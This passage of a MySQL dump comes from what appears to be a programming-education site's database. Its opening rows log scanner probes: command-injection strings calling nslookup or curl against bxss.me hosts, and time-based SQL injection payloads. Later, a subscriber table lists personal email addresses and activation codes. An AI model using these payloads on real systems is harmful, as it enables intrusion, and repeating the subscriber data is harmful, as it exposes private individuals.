"||sleep(27*1000)*jrsyly||\"'),(313,'1hNqpx34v'),(314,'(nslookup -q=cname hitypkpyvjprr2b67a.bxss.me||curl hitypkpyvjprr2b67a.bxss.me))'),(315,'$(nslookup -q=cname hitpvneecceeg728fb.bxss.me||curl hitpvneecceeg728fb.bxss.me)'),(316,'&nslookup -q=cname hituglpfvnarv9d710.bxss.me&\'\\\"`0&nslookup -q=cname hituglpfvnarv9d710.bxss.me&`\''),(317,'1*284*279*0'),(318,'1+289-284-5'),(319,'|(nslookup -q=cname hitzrqtajrocj7f1fd.bxss.me||curl hitzrqtajrocj7f1fd.bxss.me)'),(320,'`(nslookup -q=cname hitwoiyhxxdrg22625.bxss.me||curl hitwoiyhxxdrg22625.bxss.me)`'),(321,'1*868*863*0'),(322,'1+873-868-5'),(323,'|(nslookup${IFS}-q${IFS}cname${IFS}hitwpjnhwrgnb0cbc8.bxss.me||curl${IFS}hitwpjnhwrgnb0cbc8.bxss.me)'),(324,'1*615*610*0'),(325,'1+620-615-5'),(326,'1*941*936*0'),(327,'1+946-941-5'),(328,'-1 OR 2+474-474-1=0+0+0+1'),(329,'-1 OR 3+474-474-1=0+0+0+1'),(330,'1*if(now()=sysdate(),sleep(15),0)'),(331,'10\'XOR(1*if(now()=sysdate(),sleep(15),0))XOR\'Z'),(332,'10\"XOR(1*if(now()=sysdate(),sleep(15),0))XOR\"Z'),(333,'1-1; waitfor delay \'0:0:15\' -- '),(334,'1-1); waitfor delay \'0:0:15\' -- '),(335,'1-1 waitfor delay \'0:0:15\' -- '),(336,'1SHOFa4i4\'; waitfor delay \'0:0:15\' -- '),(337,'1-1 OR 929=(SELECT 929 FROM PG_SLEEP(15))--'),(338,'1-1) OR 659=(SELECT 659 FROM PG_SLEEP(15))--'),(339,'1-1)) OR 448=(SELECT 448 FROM PG_SLEEP(15))--'),(340,'1GwgcMrhd\' OR 384=(SELECT 384 FROM PG_SLEEP(15))--'),(341,'1CQms7nbk\') OR 152=(SELECT 152 FROM PG_SLEEP(15))--'),(342,'1ozZchYhN\')) OR 307=(SELECT 307 FROM PG_SLEEP(15))--'),(343,'1����%2527%2522\\\'\\\"'),(344,'@@vKG5T');
/*!40000 ALTER TABLE `example_app_visitor` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `external_course`
--

DROP TABLE IF EXISTS `external_course`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `external_course` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `certification` tinyint(1) NOT NULL,
  `badge` tinyint(1) NOT NULL,
  `highlights` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `link` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `sponsor_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `external_course_sponsor_id_68c8455e` (`sponsor_id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `external_course`
--

LOCK TABLES `external_course` WRITE;
/*!40000 ALTER TABLE `external_course` DISABLE KEYS */;
INSERT INTO `external_course` VALUES (1,'Python for Data Science',1,1,'This Python course will get you started with data science and programming in general. In just a few hours, you\'ll be able to go from zero to programming in Python with our beginner-friendly Python course.\r\n\r\nAfter completing it, you\'ll be able to use our Jupyter-based lab environment to build your own Python scripts and do basic hands-on data analysis. This free course is for you if you want to learn Python from the ground up.','https://cognitiveclass.ai/courses/python-for-data-science',1),(2,'Data Analysis with Python',1,1,'Learn how to use Python to analyze the data. This course will take you from the very beginnings of Python through the exploration of a wide range of data types. You\'ll learn how to prepare data for analysis, conduct basic statistical studies, build meaningful data visualization, forecast future trends from data, and much more!','https://cognitiveclass.ai/courses/data-analysis-python',1),(3,'Fundamentals of Digital Marketing',1,0,'Learn the foundations of digital marketing and contribute to the growth of your company or profession.','https://learndigital.withgoogle.com/digitalunlocked/course/digital-marketing',6),(4,'Understand the Basic of Code',0,0,'Get an introduction to code, find out how it works, what it can do, and how it can benefit you.','https://learndigital.withgoogle.com/digitalunlocked/course/basics-code',6),(5,'Machine Learning Crash Course',0,0,'Google\'s fast-paced, practical introduction to machine learning.','https://learndigital.withgoogle.com/digitalunlocked/course/machine-learning-crash-course',6),(6,'InfyTQ',1,0,'Crack the Free Infosys Certification examination and get a job interview with Infosys.','https://infytq.onwingspan.com/en/infytq-login',7);
/*!40000 ALTER TABLE `external_course` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `external_industry`
--

DROP TABLE IF EXISTS `external_industry`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `external_industry` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `highlights` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `external_industry`
--

LOCK TABLES `external_industry` WRITE;
/*!40000 ALTER TABLE `external_industry` DISABLE KEYS */;
INSERT INTO `external_industry` VALUES (1,'IBM','Get IBM\'s Free Certification','Learn leading-edge technologies Blockchain, Data Science, AI, Cloud, Serverless, Docker, Kubernetes and more...','industry/IBM-Logo-Design-1972-present.png'),(6,'Google','Get Google\'s Free Certification','Discover a range of free learning content designed to help grow your business or jumpstart your career. You can learn by selecting individual modules, or dive right in and take an entire course end-to-end.','industry/googlelogo_color_272x92dp_VMtEQfb.png'),(7,'Infosys','Get Infosys Free Certification with Job Oppurtunities','Get certified. Crack the Infosys Certification examination and get a job interview with Infosys.','industry/Infosys-Logo.png');
/*!40000 ALTER TABLE `external_industry` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_article`
--

DROP TABLE IF EXISTS `newsletter_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_article` (
  `id` int NOT NULL AUTO_INCREMENT,
  `sortorder` int unsigned NOT NULL,
  `title` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `text` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `url` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `post_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `newsletter_article_post_id_sortorder_cbe3c629_uniq` (`post_id`,`sortorder`),
  KEY `newsletter_article_post_id_c481e545` (`post_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_article`
--

LOCK TABLES `newsletter_article` WRITE;
/*!40000 ALTER TABLE `newsletter_article` DISABLE KEYS */;
INSERT INTO `newsletter_article` VALUES (1,10,'Programs','http://www.decodeschool.com/C-Programming/Operators',NULL,'',1),(2,20,'Posts','http://decodeschool.com/blog/python/',NULL,'',1);
/*!40000 ALTER TABLE `newsletter_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_message`
--

DROP TABLE IF EXISTS `newsletter_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_message` (
  `id` int NOT NULL AUTO_INCREMENT,
  `title` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `slug` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `date_create` datetime(6) NOT NULL,
  `date_modify` datetime(6) NOT NULL,
  `newsletter_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `newsletter_message_slug_newsletter_id_a2ab3653_uniq` (`slug`,`newsletter_id`),
  KEY `newsletter_message_slug_6dae36a9` (`slug`),
  KEY `newsletter_message_newsletter_id_b77d9df1` (`newsletter_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_message`
--

LOCK TABLES `newsletter_message` WRITE;
/*!40000 ALTER TABLE `newsletter_message` DISABLE KEYS */;
INSERT INTO `newsletter_message` VALUES (1,'C Problem Solving','c-problem-solving','2020-06-04 11:42:34.785967','2020-06-04 11:42:34.785967',1);
/*!40000 ALTER TABLE `newsletter_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_newsletter`
--

DROP TABLE IF EXISTS `newsletter_newsletter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_newsletter` (
  `id` int NOT NULL AUTO_INCREMENT,
  `title` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `slug` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `email` varchar(254) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `sender` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `visible` tinyint(1) NOT NULL,
  `send_html` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `slug` (`slug`),
  KEY `newsletter_newsletter_visible_db80e140` (`visible`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_newsletter`
--

LOCK TABLES `newsletter_newsletter` WRITE;
/*!40000 ALTER TABLE `newsletter_newsletter` DISABLE KEYS */;
INSERT INTO `newsletter_newsletter` VALUES (1,'Programs & Posts','programs-posts','madhanjaji@gmail.com','Ramesh P Natarajan',1,1);
/*!40000 ALTER TABLE `newsletter_newsletter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_newsletter_site`
--

DROP TABLE IF EXISTS `newsletter_newsletter_site`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_newsletter_site` (
  `id` int NOT NULL AUTO_INCREMENT,
  `newsletter_id` int NOT NULL,
  `site_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `newsletter_newsletter_site_newsletter_id_site_id_eaadd4df_uniq` (`newsletter_id`,`site_id`),
  KEY `newsletter_newsletter_site_newsletter_id_d5cf228e` (`newsletter_id`),
  KEY `newsletter_newsletter_site_site_id_2a546dc1` (`site_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_newsletter_site`
--

LOCK TABLES `newsletter_newsletter_site` WRITE;
/*!40000 ALTER TABLE `newsletter_newsletter_site` DISABLE KEYS */;
INSERT INTO `newsletter_newsletter_site` VALUES (2,1,3);
/*!40000 ALTER TABLE `newsletter_newsletter_site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_submission`
--

DROP TABLE IF EXISTS `newsletter_submission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_submission` (
  `id` int NOT NULL AUTO_INCREMENT,
  `publish_date` datetime(6) DEFAULT NULL,
  `publish` tinyint(1) NOT NULL,
  `prepared` tinyint(1) NOT NULL,
  `sent` tinyint(1) NOT NULL,
  `sending` tinyint(1) NOT NULL,
  `message_id` int NOT NULL,
  `newsletter_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `newsletter_submission_publish_date_6c3d8801` (`publish_date`),
  KEY `newsletter_submission_publish_2ceb081e` (`publish`),
  KEY `newsletter_submission_prepared_12eea099` (`prepared`),
  KEY `newsletter_submission_sent_7c1e3f56` (`sent`),
  KEY `newsletter_submission_sending_40b87529` (`sending`),
  KEY `newsletter_submission_message_id_35227c2e` (`message_id`),
  KEY `newsletter_submission_newsletter_id_8fa5ae76` (`newsletter_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_submission`
--

LOCK TABLES `newsletter_submission` WRITE;
/*!40000 ALTER TABLE `newsletter_submission` DISABLE KEYS */;
INSERT INTO `newsletter_submission` VALUES (4,'2020-06-05 15:23:32.000000',1,1,0,0,1,1);
/*!40000 ALTER TABLE `newsletter_submission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_submission_subscriptions`
--

DROP TABLE IF EXISTS `newsletter_submission_subscriptions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_submission_subscriptions` (
  `id` int NOT NULL AUTO_INCREMENT,
  `submission_id` int NOT NULL,
  `subscription_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `newsletter_submission_su_submission_id_subscripti_fa14b47b_uniq` (`submission_id`,`subscription_id`),
  KEY `newsletter_submission_subscriptions_submission_id_0cda0c3f` (`submission_id`),
  KEY `newsletter_submission_subscriptions_subscription_id_be932b58` (`subscription_id`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_submission_subscriptions`
--

LOCK TABLES `newsletter_submission_subscriptions` WRITE;
/*!40000 ALTER TABLE `newsletter_submission_subscriptions` DISABLE KEYS */;
INSERT INTO `newsletter_submission_subscriptions` VALUES (11,4,5),(10,4,3),(8,4,1),(9,4,2);
/*!40000 ALTER TABLE `newsletter_submission_subscriptions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `newsletter_subscription`
--

DROP TABLE IF EXISTS `newsletter_subscription`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `newsletter_subscription` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(30) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `email` varchar(254) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `ip` char(39) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `create_date` datetime(6) NOT NULL,
  `activation_code` varchar(40) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `subscribed` tinyint(1) NOT NULL,
  `subscribe_date` datetime(6) DEFAULT NULL,
  `unsubscribed` tinyint(1) NOT NULL,
  `unsubscribe_date` datetime(6) DEFAULT NULL,
  `newsletter_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `newsletter_subscription_user_id_email_newsletter_0a9641e0_uniq` (`user_id`,`email`,`newsletter_id`),
  KEY `newsletter_subscription_email_3b8020aa` (`email`),
  KEY `newsletter_subscription_subscribed_350402fe` (`subscribed`),
  KEY `newsletter_subscription_unsubscribed_8ae75c15` (`unsubscribed`),
  KEY `newsletter_subscription_newsletter_id_e9d08ab9` (`newsletter_id`),
  KEY `newsletter_subscription_user_id_4185bd67` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `newsletter_subscription`
--

LOCK TABLES `newsletter_subscription` WRITE;
/*!40000 ALTER TABLE `newsletter_subscription` DISABLE KEYS */;
INSERT INTO `newsletter_subscription` VALUES (1,NULL,'letters4ramesh@gmail.com',NULL,'2020-06-04 11:43:08.504896','z3I51AyD4f2sdFgl6KBSavgr4HxAwLznmOHtY1Bk',1,'2020-06-04 11:43:08.518896',0,NULL,1,NULL),(2,NULL,'madhanumk@gmail.com',NULL,'2020-06-04 13:05:54.764913','mTafAVntTMaxr7Pyunio4wM2XRH8ZMnjiwNtwC2V',1,'2020-06-04 13:05:54.766913',0,NULL,1,NULL),(3,NULL,'pnr.cse@karpagamtech.ac.in',NULL,'2020-06-04 13:09:35.049481','163QnIhSU7q2R0sbykWYbJ0rvtZnw4Kwq9rEjk5c',1,'2020-06-04 13:09:35.050481',0,NULL,1,NULL),(5,NULL,'bakupsofpnr@gmail.com',NULL,'2020-06-04 13:14:29.252860','TaKKNKBmee9YcLIThTHB6c1XpS1vjFG1ri30yua3',1,'2020-06-04 13:14:29.253860',0,NULL,1,NULL),(6,NULL,'arulkumarssk@gmail.com',NULL,'2020-06-05 18:06:16.077055','5Bvt9WYQEl2SCOpkaPm1hHyzfQst3IeX4djo1g9r',1,'2020-06-05 18:06:16.077543',0,NULL,1,NULL),(7,NULL,'manivijay2911@gmail.com',NULL,'2020-06-10 12:34:00.897101','3qkKesSh0TViDeVyW5YXdPoArIVl7n5r63yKFcF8',1,'2020-06-10 12:34:00.897716',0,NULL,1,NULL),(8,NULL,'b.swathi889@gmail.com',NULL,'2020-07-10 09:15:43.581652','5k9XN3QDugwFC9erBbgRWhv7riia2GypOx0ahUvw',1,'2020-07-10 09:15:43.582272',0,NULL,1,NULL),(9,NULL,'nikitarajwade7161@gmail.com',NULL,'2020-08-11 07:58:03.812707','VsP36xgi2kf3v5hOoTaNNNhqcX2XO6ILhXJFwixW',1,'2020-08-11 07:58:03.813294',0,NULL,1,NULL),(10,NULL,'deepamukilan99@gmail.com',NULL,'2020-09-11 08:24:38.314838','Ir2uVocnIc1lRSTXKGEJRyoSN7q4aDxnyya3Bsp0',1,'2020-09-11 08:24:38.315251',0,NULL,1,NULL),(11,NULL,'zaibaunique786@gmail.com',NULL,'2020-09-15 15:13:15.586933','fPR2bbuzVObAn7NjIBycqIJ79BRxZsyrnrUJKQR6',1,'2020-09-15 15:13:15.587489',0,NULL,1,NULL),(12,NULL,'gulshannnd@gmail.com',NULL,'2020-09-23 08:30:26.458432','sP86qTlyF81ODGhUiUqExw1wUOP0Eg6tTw9lYr3k',1,'2020-09-23 08:30:26.459063',0,NULL,1,NULL),(13,NULL,'asifktu@gmail.com',NULL,'2020-09-26 14:49:28.202809','3X4rroJSFij0o35VdtSsQ6JwNir4KTJPOnEjuEQI',1,'2020-09-26 14:49:28.203464',0,NULL,1,NULL),(14,NULL,'decodeschool@yahoo.com',NULL,'2020-10-14 09:33:58.130591','nf5x48NoGraYW5tHnMUxRomZav7xAaLcNqGqlnlx',1,'2020-10-14 09:33:58.131234',0,NULL,1,NULL);
/*!40000 ALTER TABLE `newsletter_subscription` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `thumbnail_kvstore`
--

DROP TABLE IF EXISTS `thumbnail_kvstore`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `thumbnail_kvstore` (
  `key` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `value` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  PRIMARY KEY (`key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `thumbnail_kvstore`
--

LOCK TABLES `thumbnail_kvstore` WRITE;
/*!40000 ALTER TABLE `thumbnail_kvstore` DISABLE KEYS */;
/*!40000 ALTER TABLE `thumbnail_kvstore` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_assignment`
--

DROP TABLE IF EXISTS `track_assignment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_assignment` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(55) NOT NULL,
  `start_date` date NOT NULL,
  `end_date` date NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_assignment`
--

LOCK TABLES `track_assignment` WRITE;
/*!40000 ALTER TABLE `track_assignment` DISABLE KEYS */;
INSERT INTO `track_assignment` VALUES (2,'Batch1_Arrays','2024-01-05','2024-01-06'),(3,'Batch1_2DArrays','2024-01-19','2024-01-19'),(4,'Batch1_Maths','2024-01-19','2024-01-19'),(5,'Bit Manipulation','2024-01-20','2024-01-20'),(6,'Batch2_Prime','2024-01-22','2024-01-22'),(7,'B2_Array','2024-01-18','2024-01-22'),(8,'B2- 2D Array 22_01_23','2024-01-22','2024-01-23'),(9,'B2_PRFIX SUM 24_01_24','2024-01-24','2024-01-24'),(10,'B2_Swindow_2_ptr','2024-01-25','2024-01-25'),(11,'B2_Sub_arr_set_sequence','2024-01-28','2024-01-28'),(12,'B2_RECURSION','2024-01-30','2024-02-05'),(13,'B2_BIT_MANIPULATION','2024-02-01','2024-02-05'),(14,'B2_SEARCHING','2024-02-03','2024-02-05'),(15,'B2_Assessment','2024-02-17','2024-02-17'),(16,'B2_SORTING','2024-02-10','2024-02-16'),(17,'B2_HASHING','2024-02-12','2024-02-20'),(18,'B2_LINKED_LIST','2024-02-13','2024-02-20'),(19,'B2_LINKED_LIST2','2024-02-15','2024-02-20'),(20,'B2_STACK & QUEUE','2024-02-27','2024-02-27'),(21,'B2_TREE','2024-02-27','2024-02-27'),(22,'B2_TREEVIEW(BST1)','2024-02-27','2024-02-27');
/*!40000 ALTER TABLE `track_assignment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_assignment_problems`
--

DROP TABLE IF EXISTS `track_assignment_problems`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_assignment_problems` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `assignment_id` bigint NOT NULL,
  `problem_id` bigint NOT NULL,
  PRIMARY KEY (`id`),
  KEY `track_assignment_pro_assignment_id_03260666_fk_track_ass` (`assignment_id`),
  KEY `track_assignment_pro_problem_id_4c46aab3_fk_track_pro` (`problem_id`),
  CONSTRAINT `track_assignment_pro_assignment_id_03260666_fk_track_ass` FOREIGN KEY (`assignment_id`) REFERENCES `track_assignment` (`id`),
  CONSTRAINT `track_assignment_pro_problem_id_4c46aab3_fk_track_pro` FOREIGN KEY (`problem_id`) REFERENCES `track_problem` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=160 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_assignment_problems`
--

LOCK TABLES `track_assignment_problems` WRITE;
/*!40000 ALTER TABLE `track_assignment_problems` DISABLE KEYS */;
INSERT INTO `track_assignment_problems` VALUES (4,2,412),(5,2,1572),(6,2,1929),(7,2,2114),(8,2,42),(9,2,1131),(10,2,59),(11,2,164),(12,2,53),(13,2,73),(14,2,31),(15,3,1672),(16,3,1480),(17,3,1582),(18,3,2022),(19,3,74),(20,3,304),(21,3,769),(22,3,768),(23,3,867),(24,3,1351),(25,3,566),(26,3,1572),(27,4,1979),(28,4,728),(29,4,1512),(30,2,1281),(31,4,1688),(32,4,485),(33,4,470),(34,4,1390),(35,4,1185),(36,4,836),(37,4,168),(39,7,1480),(40,7,1512),(41,7,1979),(42,7,1207),(44,7,2206),(45,7,287),(46,7,442),(47,7,162),(48,8,59),(49,8,1672),(50,8,766),(51,8,1572),(52,8,1351),(53,8,867),(54,8,73),(55,8,378),(56,9,1413),(57,9,724),(58,9,1480),(59,9,1732),(60,9,209),(61,9,560),(62,9,2772),(63,9,1074),(64,10,1763),(65,10,2760),(66,10,209),(67,10,1004),(68,10,1248),(69,10,392),(70,10,75),(71,10,151),(72,11,209),(73,11,53),(74,11,2099),(75,11,300),(76,11,560),(77,11,525),(78,11,1031),(79,11,891),(80,12,509),(81,12,231),(82,12,50),(83,12,390),(84,12,779),(85,12,1922),(86,12,60),(87,12,342),(88,13,136),(89,13,190),(90,13,338),(91,13,476),(92,13,868),(93,13,318),(94,13,29),(95,13,464),(96,14,1482),(97,14,1300),(98,14,1283),(99,14,875),(100,14,475),(101,14,1201),(102,14,69),(103,14,1552),(104,15,1268),(105,16,169),(106,16,217),(107,16,268),(108,16,912),(109,16,75),(110,16,179),(111,16,27),(112,17,706),(113,17,705),(114,17,1),(115,17,771),(116,17,819),(117,17,1002),(118,17,1146),(119,17,1487),(120,18,206),(121,18,234),(122,18,876),(123,18,19),(124,18,92),(125,18,21),(126,18,160),(127,19,141),(128,19,203),(129,19,61),(130,19,143),(131,19,237),(132,19,1721),(133,19,146),(134,19,328),(135,20,20),(136,20,225),(137,20,232),(138,20,496),(139,20,735),(140,20,239),(141,20,341),(142,20,42),(143,21,100),(144,21,101),(145,21,104),(146,21,110),(147,21,144),(148,21,145),(149,21,94),(150,21,257),(151,21,404),(152,22,501),(153,22,653),(154,22,700),(155,22,235),(156,22,199),(157,22,236),(158,22,108),(159,22,450);
/*!40000 ALTER TABLE `track_assignment_problems` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_batch`
--

DROP TABLE IF EXISTS `track_batch`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_batch` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `start_year` int NOT NULL,
  `end_year` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_batch`
--

LOCK TABLES `track_batch` WRITE;
/*!40000 ALTER TABLE `track_batch` DISABLE KEYS */;
INSERT INTO `track_batch` VALUES (1,2021,2025);
/*!40000 ALTER TABLE `track_batch` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_course`
--

DROP TABLE IF EXISTS `track_course`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_course` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `course_title` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_course`
--

LOCK TABLES `track_course` WRITE;
/*!40000 ALTER TABLE `track_course` DISABLE KEYS */;
INSERT INTO `track_course` VALUES (1,'Batch1'),(2,'Batch2');
/*!40000 ALTER TABLE `track_course` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_course_enrollement`
--

DROP TABLE IF EXISTS `track_course_enrollement`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_course_enrollement` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `course_id` bigint NOT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `track_course_enrollement_course_id_cf5fc066_fk_track_course_id` (`course_id`),
  CONSTRAINT `track_course_enrollement_course_id_cf5fc066_fk_track_course_id` FOREIGN KEY (`course_id`) REFERENCES `track_course` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=121 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_course_enrollement`
--

LOCK TABLES `track_course_enrollement` WRITE;
/*!40000 ALTER TABLE `track_course_enrollement` DISABLE KEYS */;
